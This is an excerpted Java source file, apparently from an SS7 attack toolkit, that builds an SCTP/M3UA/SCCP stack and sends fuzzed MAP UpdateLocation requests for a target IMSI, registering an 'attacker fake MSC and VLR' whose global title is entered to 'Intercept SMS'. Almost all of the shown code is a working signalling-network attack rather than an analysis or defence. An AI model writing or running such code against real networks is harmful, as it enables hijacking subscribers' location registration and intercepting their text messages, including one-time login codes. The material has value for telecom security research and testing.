...
import fuzzy.FuzzyIMSIImpl;

abstract class FUlLowLevelServer implements MAPDialogListener, MAPServiceMobilityListener, MAPServiceSmsListener {
	...
	try {
	    ...
	    System.out.print("\033[34m[*]\033[0mSet remote PC: ");
	    CLIENT_SPC = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet local PC: ");
	    SERVER_SPC = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet remote IP: ");
	    CLIENT_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet remote Port: ");
	    CLIENT_PORT = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet local IP: ");
	    SERVER_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet local Port: ");
	...
	try {
	    ...
	    CLIENT_IP = "192.168.119.145";
	    CLIENT_PORT = 2905;

	    SERVER_IP = "192.168.156.220";

	    SERVER_PORT = 2906;

	    NETWORK_INDICATOR = 2;

	    String fuzzy_strings_file = "/home/rosalia/tools/ss7/ss7-src/imsi.txt";

	    target_imsiGT = "3922201123456789";

	    fuzzy_imsi = Files.readAllLines(new File(fuzzy_strings_file).toPath(), Charset.defaultCharset());

	    System.out.print("\033[34m[*]\033[0mSet Your MSC GT to Intercept SMS: ");
	    attacker_msc = "393316001153";
...
public class FuzzyUpdateLocationServer extends FUlLowLevelServer {
    ...
    public FuzzyUpdateLocationServer() {
    ...
    private void startInitSCTP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack Server Mode....");
	this.stopSCTP();
	try {
    ...
    private void completeInitSCTP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack Server Mode....");
	try {

	    // 1. Create SCTP Server
	    sctpManagement.addServer("TestServer", SERVER_IP, SERVER_PORT, IpChannelType.SCTP, null);
	    // 2. Create SCTP Server Association

	    sctpManagement.addServerAssociation(CLIENT_IP, CLIENT_PORT, "TestServer", SERVER_ASSOCIATION_NAME,
		    IpChannelType.SCTP);

	    this.assoc = this.sctpManagement.getAssociation(SERVER_ASSOCIATION_NAME);
	    // 3. Start Server
	    sctpManagement.startServer("TestServer");

	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack Server Mode....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing SCTP: " + e.getMessage());
	    System.exit(1);
	}
	...
	try {
	    ...
	    this.m3UAMgmt.setDeliveryMessageThreadCount(10);
	    this.m3UAMgmt.start();
	    ...
	    this.m3UAMgmt.createAs("AS1", Functionality.SGW, ExchangeType.SE, IPSPType.CLIENT, rc, trafficModeType, 1,
		    null);

	    // Step 2 : Create ASP
	    this.m3UAMgmt.createAspFactory("ASP1", SERVER_ASSOCIATION_NAME);
	    ...
	    // this.m3UAMgmt.addRoute(CLIENT_SPC, SERVER_SPC, SERVICE_INDICATOR, "AS1");

	    this.m3UAMgmt.addRoute(CLIENT_SPC, -1, -1, "AS1");
	...
	try {
	    ...
	    this.sccpStack.getSccpResource().addRemoteSsn(0, CLIENT_SPC, SSN_Client, 0, false);
	    ...
	    ParameterFactory parameterFactory = this.sccpProvider.getParameterFactory();

	    GlobalTitle0100 remoteGT = null;
	    GlobalTitle0100 gtPattern = null;

	    GlobalTitle0100 localGT = null;

	    // SCCP routing table
	    if (this.NETWORK_INDICATOR == 0) {
		remoteGT = parameterFactory.createGlobalTitle("-", 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);
		gtPattern = parameterFactory.createGlobalTitle("*", 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);
		localGT = parameterFactory.createGlobalTitle("-", 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);

	    } else if (this.NETWORK_INDICATOR == 2) {
		remoteGT = parameterFactory.createGlobalTitle("-", 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		...
		System.out.println("\033[31m[-]\033[0mError Unsupported network indicator");
		System.exit(2);
	    }
	    Router router = this.sccpStack.getRouter();

	    SccpAddress localAddress = new SccpAddressImpl(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localGT,
		    SERVER_SPC, SSN_Server);
	    router.addRoutingAddress(1, localAddress);
	    SccpAddress remoteAddress = new SccpAddressImpl(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteGT,
		    CLIENT_SPC, SSN_Client);
	    router.addRoutingAddress(2, remoteAddress);

	    SccpAddress pattern = new SccpAddressImpl(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtPattern, 0, 0);
	    router.addRule(1, RuleType.SOLITARY, LoadSharingAlgorithm.Bit0, OriginationType.REMOTE, pattern, "K", 1, -1,
		    null, 0, null);
	    router.addRule(2, RuleType.SOLITARY, LoadSharingAlgorithm.Bit0, OriginationType.LOCAL, pattern, "K", 2, -1,
		    null, 0, null);
	    router.addLongMessageRule(1, 1, 16384, LongMessageRuleType.XUDT_ENABLED);
	...
	try {
	    ...
	    ISDNAddressString msc = null;

	    GlobalTitle0100 gtMsc = null;
	    GlobalTitle0100 calledIMSIGT = null;
	    MAPParameterFactory mapParameterFactory = this.mapProvider.getMAPParameterFactory();
	    ParameterFactory sccpParameterFactory = this.sccpProvider.getParameterFactory();
	    if (this.NETWORK_INDICATOR == 0) {
		// Create of the attacker fake MSC and VLR
		msc = mapParameterFactory.createISDNAddressString(AddressNature.international_number,
			NumberingPlan.ISDN, attacker_msc);
		// in UL scenario the routing is derived from the IMSI, IMSI(E.212) is exchanged
		// to the E.214 format
		calledIMSIGT = sccpParameterFactory.createGlobalTitle(target_imsiGT, 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
			NatureOfAddress.INTERNATIONAL);
		gtMsc = sccpParameterFactory.createGlobalTitle(attacker_msc, 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);
	    } else if (this.NETWORK_INDICATOR == 2) {
		// Create of the attacker fake MSC and VLR
		msc = mapParameterFactory.createISDNAddressString(AddressNature.national_significant_number,
			NumberingPlan.ISDN, attacker_msc);
	    ...
	    SccpAddress callingParty = new SccpAddressImpl(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtMsc,
		    SERVER_SPC, SSN_Server);

	    SccpAddress calledParty = new SccpAddressImpl(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledIMSIGT,
		    CLIENT_SPC, SSN_Client);
		...
		try {
		    ...
		    FuzzyIMSIImpl imsi = new FuzzyIMSIImpl(1, fi.length(), fi);
		    mapDialog.addUpdateLocationRequest((IMSI) imsi, msc, null, msc, null, null, null, false, false,
    ...
    public void stopM3UA() throws Exception {
	...
	final FuzzyUpdateLocationServer attacker = new FuzzyUpdateLocationServer();

	try {
	    attacker.initializeStack();

	    // Lets pause for 3 minutes so stacks are initialized properly
	    Thread.sleep(180000);
	    attacker.initiateUL();
